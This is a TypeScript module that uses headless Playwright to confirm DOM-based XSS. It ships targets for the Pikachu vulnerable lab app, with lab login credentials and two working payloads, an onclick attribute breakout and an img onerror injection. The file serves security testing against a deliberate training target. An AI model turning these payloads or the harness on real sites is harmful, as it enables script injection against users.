/**
 * DomXssVerifier — headless browser PoC verification for DOM-based XSS.
 *
 * DOM XSS cannot be verified via HTTP-only tools (curl/PocSandbox) because
 * the injection happens in client-side JavaScript (innerHTML, document.write, etc).
 * This module uses Playwright to:
 * 1. Navigate to the target page
 * 2. Inject XSS payloads into DOM sinks
 * 3. Detect successful injection via DOM inspection or JS error events
 *
 * Usage:
 *   const verifier = new DomXssVerifier({ baseUrl: 'http://localhost:8083' });
 *   const result = await verifier.verify({ url: '/vul/xss/xss_dom.php', ... });
 */

import type { Browser, Page, BrowserContext } from 'playwright';

type PlaywrightChromium = {
  launch(options?: { headless?: boolean }): Promise<Browser>;
};

let _chromium: PlaywrightChromium | null = null;

async function getChromium(): Promise<PlaywrightChromium> {
  if (!_chromium) {
    const pw = await import('playwright');
    _chromium = pw.chromium;
  }
  return _chromium;
}

export interface DomXssTarget {
  id: string;
  url: string;
  inputSelector: string;
  triggerSelector: string;
  payload: string;
  domSelector: string;
  detectionMethod: 'inner_html' | 'page_error' | 'console_log';
  detectionPattern: string | RegExp;
  loginRequired?: boolean;
  loginUrl?: string;
  loginFields?: Record<string, string>;
}

export interface DomXssResult {
  id: string;
  success: boolean;
  domContent: string;
  errors: string[];
  logs: string[];
  statusCode: number;
  responseTimeMs: number;
}

export class DomXssVerifier {
  private readonly baseUrl: string;
  private browser: Browser | null = null;
  private context: BrowserContext | null = null;

  constructor(options: { baseUrl: string }) {
    this.baseUrl = options.baseUrl;
  }

  async init(): Promise<void> {
    const chromium = await getChromium();
    this.browser = await chromium.launch({ headless: true });
    this.context = await this.browser.newContext();
  }

  async close(): Promise<void> {
    await this.context?.close();
    await this.browser?.close();
    this.browser = null;
    this.context = null;
  }

  async verify(target: DomXssTarget): Promise<DomXssResult> {
    const start = Date.now();
    const errors: string[] = [];
    const logs: string[] = [];

    if (!this.browser || !this.context) await this.init();

    const page = await this.context!.newPage();
    page.on('pageerror', (err) => errors.push(err.message));
    page.on('console', (msg) => {
      if (msg.type() === 'log') logs.push(msg.text());
    });

    try {
      if (target.loginRequired && target.loginUrl) {
        await this.login(page, target.loginUrl, target.loginFields ?? {});
      }

      await page.goto(`${this.baseUrl}${target.url}`, {
        waitUntil: 'domcontentloaded',
        timeout: 10000,
      });

      await page.fill(target.inputSelector, target.payload);
      await page.click(target.triggerSelector);
      await page.waitForTimeout(500);

      const domContent = await page.evaluate(
        (sel: string) => document.querySelector(sel)?.innerHTML ?? '',
        target.domSelector
      );

      let success = false;
      if (target.detectionMethod === 'inner_html') {
        const pattern =
          typeof target.detectionPattern === 'string'
            ? new RegExp(target.detectionPattern, 'i')
            : target.detectionPattern;
        success = pattern.test(domContent);
      } else if (target.detectionMethod === 'page_error') {
        const pattern =
          typeof target.detectionPattern === 'string'
            ? new RegExp(target.detectionPattern)
            : target.detectionPattern;
        success = errors.some((e) => pattern.test(e));
      } else if (target.detectionMethod === 'console_log') {
        const pattern =
          typeof target.detectionPattern === 'string'
            ? new RegExp(target.detectionPattern)
            : target.detectionPattern;
        success = logs.some((l) => pattern.test(l));
      }

      return {
        id: target.id,
        success,
        domContent,
        errors,
        logs,
        statusCode: 200,
        responseTimeMs: Date.now() - start,
      };
    } catch (e) {
      return {
        id: target.id,
        success: false,
        domContent: '',
        errors: [(e as Error).message],
        logs,
        statusCode: 0,
        responseTimeMs: Date.now() - start,
      };
    } finally {
      await page.close();
    }
  }

  private async login(page: Page, loginUrl: string, fields: Record<string, string>): Promise<void> {
    await page.goto(`${this.baseUrl}${loginUrl}`, {
      waitUntil: 'domcontentloaded',
      timeout: 10000,
    });
    for (const [selector, value] of Object.entries(fields)) {
      if (selector === 'submit') {
        await page.click(value);
      } else {
        await page.fill(selector, value);
      }
    }
    await page.waitForTimeout(1000);
  }

  async verifyAll(targets: DomXssTarget[]): Promise<DomXssResult[]> {
    const results: DomXssResult[] = [];
    for (const t of targets) {
      results.push(await this.verify(t));
    }
    return results;
  }
}

export const PIKACHU_DOM_XSS_TARGETS: DomXssTarget[] = [
  {
    id: 'pikachu-dom-xss-innerhtml',
    url: '/vul/xss/xss_dom.php',
    inputSelector: '#text',
    triggerSelector: '#button',
    payload: "' onclick='alert(1)",
    domSelector: '#dom',
    detectionMethod: 'inner_html',
    detectionPattern: /onclick.*alert/i,
    loginRequired: true,
    loginUrl: '/vul/burteforce/bf_form.php',
    loginFields: {
      'input[name="username"]': 'admin',
      'input[name="password"]': '123456',
      submit: 'input[type="submit"]',
    },
  },
  {
    id: 'pikachu-dom-xss-onerror',
    url: '/vul/xss/xss_dom.php',
    inputSelector: '#text',
    triggerSelector: '#button',
    payload: "'><img src=x onerror='throw new Error(\"DOM_XSS_ONERROR\")'>",
    domSelector: '#dom',
    detectionMethod: 'page_error',
    detectionPattern: /DOM_XSS_ONERROR/,
    loginRequired: true,
    loginUrl: '/vul/burteforce/bf_form.php',
    loginFields: {
      'input[name="username"]': 'admin',
      'input[name="password"]': '123456',
      submit: 'input[type="submit"]',
    },
  },
];
